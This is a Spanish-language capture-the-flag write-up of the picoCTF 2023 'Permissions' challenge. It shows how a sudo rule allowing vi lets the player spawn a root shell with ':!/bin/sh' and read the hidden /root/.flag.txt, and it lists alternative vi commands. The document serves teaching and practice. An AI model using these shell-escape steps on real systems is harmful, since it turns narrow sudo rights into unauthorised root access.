Permissions - picoCTF 2023

Categoría: General Skills
Dificultad: Medium
Puntos: 100
Autor: Geoffrey Njogu
📝 Descripción

Can you read files in the root file?
text

ssh -p 52756 picoplayer@saturn.picoctf.net
Password: e3pn6lmvHt

🔍 Enumeración
1. Conexión SSH
bash

ssh -p 52756 picoplayer@saturn.picoctf.net
# Password: e3pn6lmvHt

2. Verificación inicial
bash

whoami
# picoplayer

ls -la /root
# ls: cannot open directory '/root': Permission denied

cd /root
# -bash: cd: /root: Permission denied

No tenemos acceso al directorio de root.
3. Búsqueda de flag
bash

find / -name "flag*" 2>/dev/null
# Solo muestra archivos del sistema en /sys, nada interesante

4. Verificar permisos sudo
bash

sudo -l

Salida:
text

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi

🎯 Podemos ejecutar vi como root.
💥 Explotación
Paso 1: Abrir vi como root
bash

sudo vi

Paso 2: Spawnear shell desde vi

Dentro de vi:
text

:!/bin/sh

bash

whoami
# root

✅ Shell como root obtenida.
Paso 3: Buscar la flag
bash

ls -la /root

text

total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Jul  2 16:32 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile

La flag está en un archivo oculto: .flag.txt
Paso 4: Leer la flag
bash

cat /root/.flag.txt

🏁 Flag
text

picoCTF{**********************************}

🧠 Explicación

    sudo -l reveló que podíamos ejecutar vi como root

    vi permite ejecutar comandos del sistema con :!comando

    Al ejecutar sudo vi, el editor corre con privilegios de root

    Al spawnear una shell con :!/bin/sh, esta hereda los privilegios de root

    La flag estaba en un archivo oculto (.flag.txt), por eso el find con flag* no la encontró

🔧 Métodos alternativos

Desde sudo vi también se puede:
vim

:e /root/.flag.txt
:r /root/.flag.txt
:!cat /root/.flag.txt

📚 Referencias

    GTFOBins - vi

    HackTricks - Linux Privilege Escalation

kr3s4l4 · Julio 2026
